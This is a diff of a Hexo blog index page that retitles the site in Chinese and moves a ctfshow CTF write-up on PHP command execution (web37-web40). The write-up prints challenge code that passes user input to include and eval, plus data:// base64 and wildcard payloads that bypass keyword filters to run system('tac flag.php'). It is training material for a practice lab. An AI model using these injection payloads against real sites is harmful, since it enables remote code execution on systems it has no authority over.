@@ -4,17 +4,17 @@
   <meta charset="utf-8">
   
   
-  <title>Hexo</title>
+  <title>wzh的倒立吃面条的地方</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
   <meta property="og:type" content="website">
-<meta property="og:title" content="Hexo">
+<meta property="og:title" content="wzh的倒立吃面条的地方">
 <meta property="og:url" content="http://example.com/index.html">
-<meta property="og:site_name" content="Hexo">
-<meta property="og:locale" content="en_US">
-<meta property="article:author" content="John Doe">
+<meta property="og:site_name" content="wzh的倒立吃面条的地方">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:author" content="Wang Han">
 <meta name="twitter:card" content="summary">
   
-    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+    <link rel="alternate" href="/atom.xml" title="wzh的倒立吃面条的地方" type="application/atom+xml">
   
   
     <link rel="shortcut icon" href="/favicon.png">
@@ -39,8 +39,12 @@
   <div id="header-outer" class="outer">
     <div id="header-title" class="inner">
       <h1 id="logo-wrap">
-        <a href="/" id="logo">Hexo</a>
+        <a href="/" id="logo">wzh的倒立吃面条的地方</a>
       </h1>
+      
+        <h2 id="subtitle-wrap">
+          <a href="/" id="subtitle">爹味：做人呢，做重要的是做好自己，别人真的不能真正理解你的“好”</a>
+        </h2>
       
     </div>
     <div id="header-inner" class="inner">
@@ -55,12 +59,12 @@
       <nav id="sub-nav">
         
         
-          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
+          <a class="nav-icon" href="/atom.xml" title="RSS 订阅"><span class="fa fa-rss"></span></a>
         
-        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
+        <a class="nav-icon nav-search-btn" title="搜索"><span class="fa fa-search"></span></a>
       </nav>
       <div id="search-form-wrap">
-        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="搜索"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
       </div>
     </div>
   </div>
@@ -68,107 +72,6 @@
 
       <div class="outer">
         <section id="main">
-  
-    <article id="post-hack/ctfshow/web入门/命令执行/ctfshow-web入门系列-命令执行-web37-web44" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2024/10/01/hack/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/ctfshow-web%E5%85%A5%E9%97%A8%E7%B3%BB%E5%88%97-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-web37-web44/" class="article-date">
-  <time class="dt-published" datetime="2024-10-01T04:04:00.000Z" itemprop="datePublished">2024-10-01</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/hack/">hack</a>►<a class="article-category-link" href="/categories/hack/ctfshow/">ctfshow</a>►<a class="article-category-link" href="/categories/hack/ctfshow/web%E5%85%A5%E9%97%A8/">web入门</a>►<a class="article-category-link" href="/categories/hack/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">命令执行</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2024/10/01/hack/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/ctfshow-web%E5%85%A5%E9%97%A8%E7%B3%BB%E5%88%97-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-web37-web44/">ctfshow-web入门系列-命令执行-web37-web44</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="web37"><a href="#web37" class="headerlink" title="web37"></a>web37</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">//flag in flag.php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h2 id="环境说明"><a href="#环境说明" class="headerlink" title="环境说明"></a>环境说明</h2><p>首先这题开始文件包含了，如果想执行命令，只能依赖php:&#x2F;&#x2F;input或者data协议去执行php代码<br>这题过滤了flag关键字，我希望能通过这道题练一下data:&#x2F;&#x2F;text&#x2F;&#x2F;plain协议的base64编码的变体，这样可以在协议内部不包含flag关键字</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?c=data://text/plain;base64,PD9waHAgCnN5c3RlbSgidGFjIGZsYWcucGhwIikKPz4=</span><br><span class="line"></span><br><span class="line">&lt;?php </span><br><span class="line">system(&quot;tac flag.php&quot;)</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<h1 id="web38"><a href="#web38" class="headerlink" title="web38"></a>web38</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag in flag.php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|php|file/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h2 id="环境说明-1"><a href="#环境说明-1" class="headerlink" title="环境说明"></a>环境说明</h2><p>由于是文件包含函数的过滤</p>
-<ul>
-<li>伪协议过滤<ul>
-<li>file:/&#x2F;</li>
-</ul>
-</li>
-<li>关键字<ul>
-<li>flag</li>
-<li>php</li>
-</ul>
-</li>
-</ul>
-<h2 id="下一步"><a href="#下一步" class="headerlink" title="下一步"></a>下一步</h2><p>使用data:&#x2F;&#x2F;text&#x2F;plain;base64去绕过关键字的过滤，或者仅仅对于flag的过滤使用通配符</p>
-<h1 id="web39"><a href="#web39" class="headerlink" title="web39"></a>web39</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag in flag.php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$c</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h2 id="环境说明-2"><a href="#环境说明-2" class="headerlink" title="环境说明"></a>环境说明</h2><p>这题变体了，是含文件后缀限制的，我们的思路还是利用可以命令执行的伪协议，data:&#x2F;&#x2F;text&#x2F;plain和(php:&#x2F;&#x2F;input 这个在这里没法绕过限制，因为是get方式提交的php代码,php:&#x2F;&#x2F;input的代码是放在post里面的），在其中嵌入php代码的起始符和结束符，就可以绕过文件后缀名的限制了，例如</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;data://text/plain,&lt;?php system(&quot;</span>tac fla?.php<span class="string">&quot;);?&gt;</span></span><br><span class="line"><span class="string">		&quot;</span>.<span class="string">&quot;.php&quot;</span>)</span><br><span class="line"><span class="comment">//等价于</span></span><br></pre></td></tr></table></figure>
-<h2 id="原理解释"><a href="#原理解释" class="headerlink" title="原理解释"></a>原理解释</h2><p>include是包含了文件，如果是php代码，就可以执行<br>data:/&#x2F;text/plain能够将协议里的输入作为文件<br>&#x2F;&#x2F;text&#x2F;plain将文本作为文件，但是include中的文件如果有php代码就可以执行，所以成为了命令执行<br>真实写入的文件</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&quot;tac fla?.php&quot;</span>);<span class="meta">?&gt;</span>php</span><br><span class="line"><span class="comment">// 文件后缀名的限制被字符串拼接data伪协议的文件内容里面了，</span></span><br><span class="line"><span class="comment">//由于?&gt;闭合了，php被忽略了</span></span><br></pre></td></tr></table></figure>
-<h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><h3 id="不可以使用data伪协议的编码"><a href="#不可以使用data伪协议的编码" class="headerlink" title="不可以使用data伪协议的编码"></a>不可以使用data伪协议的编码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;data://text/plain;base64,PD9waHAgCnN5c3RlbSgidGFjIGZsYWcucGhwIikKPz4=.php&quot;</span>)</span><br></pre></td></tr></table></figure>
-<p>拼接的.php将会干扰解码，因为data伪协议等于会对在url中编码的结果自动解码，然而.php是非编码部分</p>
-<h1 id="web40"><a href="#web40" class="headerlink" title="web40"></a>web40</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h2 id="环境说明-3"><a href="#环境说明-3" class="headerlink" title="环境说明"></a>环境说明</h2><ul>
-<li>符号<ul>
-<li>所有字符数字</li>
-<li>~</li>
-<li>`</li>
-<li>@</li>
-<li>#</li>
-<li>$</li>
-<li>%</li>
-<li>^</li>
-<li>&amp;</li>
-<li>*</li>
-<li>中文（</li>
-<li>中文）</li>
-<li>-</li>
-<li>&#x3D;</li>
-<li>+</li>
-<li>{}</li>
-<li>[]</li>
-<li>:</li>
-<li>‘</li>
-<li>“</li>
-<li>,</li>
-<li>&lt;&gt;</li>
-<li>.</li>
-<li>&#x2F;</li>
-<li>?</li>
-<li>\(第一个转义是告诉php字符串有一个\开头（用于标明起始的匹配 ），第一个\的后面是要匹配的字符，同时要匹配的字符也要双写\,所以一共有四个)</li>
-</ul>
-</li>
-</ul>
-<h2 id="下一步，我该做些什么"><a href="#下一步，我该做些什么" class="headerlink" title="下一步，我该做些什么"></a>下一步，我该做些什么</h2><p>这道题把之前的日志注入和文件包含绕过的前提，$符号给过滤了，同时禁用了单双引号，分隔符上面只过滤了空格和超全局数组，php的终结符没法用了，bash的%0a换行仍然可用，引号的超全家数组替代也被过滤了（没法使用引号也自然没法执行系统命令），由于$被禁用，自己创建新的键也无望，因此，我们要引出一个知识点，无参数rce，仅仅依赖堆叠函数就可以找到自己想要的。</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2024/10/01/hack/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/ctfshow-web%E5%85%A5%E9%97%A8%E7%B3%BB%E5%88%97-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-web37-web44/" data-id="cm1px096z0000c8vh911acepg" data-title="ctfshow-web入门系列-命令执行-web37-web44" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" rel="tag">命令执行</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-
   
     <article id="post-hack/ctfshow/web入门/命令执行/ctfshow-web入门系列-命令执行-web29-web36" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
@@ -487,7 +390,154 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2024/10/01/hack/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/ctfshow-web%E5%85%A5%E9%97%A8%E7%B3%BB%E5%88%97-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-web29-web36/" data-id="cm1px09730001c8vh5ykk5yfk" data-title="ctfshow-web入门系列-命令执行-web29-web36" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2024/10/01/hack/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/ctfshow-web%E5%85%A5%E9%97%A8%E7%B3%BB%E5%88%97-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-web29-web36/" data-id="cm1qm1c9500009wvh3fz084jd" data-title="ctfshow-web入门系列-命令执行-web29-web36" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" rel="tag">命令执行</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-hack/ctfshow/web入门/命令执行/ctfshow-web入门系列-命令执行-web37-web44" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2024/10/01/hack/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/ctfshow-web%E5%85%A5%E9%97%A8%E7%B3%BB%E5%88%97-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-web37-web44/" class="article-date">
+  <time class="dt-published" datetime="2024-10-01T04:04:00.000Z" itemprop="datePublished">2024-10-01</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/hack/">hack</a>►<a class="article-category-link" href="/categories/hack/ctfshow/">ctfshow</a>►<a class="article-category-link" href="/categories/hack/ctfshow/web%E5%85%A5%E9%97%A8/">web入门</a>►<a class="article-category-link" href="/categories/hack/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">命令执行</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2024/10/01/hack/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/ctfshow-web%E5%85%A5%E9%97%A8%E7%B3%BB%E5%88%97-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-web37-web44/">ctfshow-web入门系列-命令执行-web37-web44</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="web37"><a href="#web37" class="headerlink" title="web37"></a>web37</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">//flag in flag.php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="环境说明"><a href="#环境说明" class="headerlink" title="环境说明"></a>环境说明</h2><p>首先这题开始文件包含了，如果想执行命令，只能依赖php:&#x2F;&#x2F;input或者data协议去执行php代码<br>这题过滤了flag关键字，我希望能通过这道题练一下data:&#x2F;&#x2F;text&#x2F;&#x2F;plain协议的base64编码的变体，这样可以在协议内部不包含flag关键字</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?c=data://text/plain;base64,PD9waHAgCnN5c3RlbSgidGFjIGZsYWcucGhwIikKPz4=</span><br><span class="line"></span><br><span class="line">&lt;?php </span><br><span class="line">system(&quot;tac flag.php&quot;)</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<h1 id="web38"><a href="#web38" class="headerlink" title="web38"></a>web38</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag in flag.php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|php|file/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="环境说明-1"><a href="#环境说明-1" class="headerlink" title="环境说明"></a>环境说明</h2><p>由于是文件包含函数的过滤</p>
+<ul>
+<li>伪协议过滤<ul>
+<li>file:/&#x2F;</li>
+</ul>
+</li>
+<li>关键字<ul>
+<li>flag</li>
+<li>php</li>
+</ul>
+</li>
+</ul>
+<h2 id="下一步"><a href="#下一步" class="headerlink" title="下一步"></a>下一步</h2><p>使用data:&#x2F;&#x2F;text&#x2F;plain;base64去绕过关键字的过滤，或者仅仅对于flag的过滤使用通配符</p>
+<h1 id="web39"><a href="#web39" class="headerlink" title="web39"></a>web39</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag in flag.php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$c</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="环境说明-2"><a href="#环境说明-2" class="headerlink" title="环境说明"></a>环境说明</h2><p>这题变体了，是含文件后缀限制的，我们的思路还是利用可以命令执行的伪协议，data:&#x2F;&#x2F;text&#x2F;plain和(php:&#x2F;&#x2F;input 这个在这里没法绕过限制，因为是get方式提交的php代码,php:&#x2F;&#x2F;input的代码是放在post里面的），在其中嵌入php代码的起始符和结束符，就可以绕过文件后缀名的限制了，例如</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;data://text/plain,&lt;?php system(&quot;</span>tac fla?.php<span class="string">&quot;);?&gt;</span></span><br><span class="line"><span class="string">		&quot;</span>.<span class="string">&quot;.php&quot;</span>)</span><br><span class="line"><span class="comment">//等价于</span></span><br></pre></td></tr></table></figure>
+<h2 id="原理解释"><a href="#原理解释" class="headerlink" title="原理解释"></a>原理解释</h2><p>include是包含了文件，如果是php代码，就可以执行<br>data:/&#x2F;text/plain能够将协议里的输入作为文件<br>&#x2F;&#x2F;text&#x2F;plain将文本作为文件，但是include中的文件如果有php代码就可以执行，所以成为了命令执行<br>真实写入的文件</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&quot;tac fla?.php&quot;</span>);<span class="meta">?&gt;</span>php</span><br><span class="line"><span class="comment">// 文件后缀名的限制被字符串拼接data伪协议的文件内容里面了，</span></span><br><span class="line"><span class="comment">//由于?&gt;闭合了，php被忽略了</span></span><br></pre></td></tr></table></figure>
+<h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><h3 id="不可以使用data伪协议的编码"><a href="#不可以使用data伪协议的编码" class="headerlink" title="不可以使用data伪协议的编码"></a>不可以使用data伪协议的编码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;data://text/plain;base64,PD9waHAgCnN5c3RlbSgidGFjIGZsYWcucGhwIikKPz4=.php&quot;</span>)</span><br></pre></td></tr></table></figure>
+<p>拼接的.php将会干扰解码，因为data伪协议等于会对在url中编码的结果自动解码，然而.php是非编码部分</p>
+<h1 id="web40"><a href="#web40" class="headerlink" title="web40"></a>web40</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="环境说明-3"><a href="#环境说明-3" class="headerlink" title="环境说明"></a>环境说明</h2><ul>
+<li>符号<ul>
+<li>所有字符数字</li>
+<li>~</li>
+<li>`</li>
+<li>@</li>
+<li>#</li>
+<li>$</li>
+<li>%</li>
+<li>^</li>
+<li>&amp;</li>
+<li>*</li>
+<li>中文（</li>
+<li>中文）</li>
+<li>-</li>
+<li>&#x3D;</li>
+<li>+</li>
+<li>{}</li>
+<li>[]</li>
+<li>:</li>
+<li>‘</li>
+<li>“</li>
+<li>,</li>
+<li>&lt;&gt;</li>
+<li>.</li>
+<li>&#x2F;</li>
+<li>?</li>
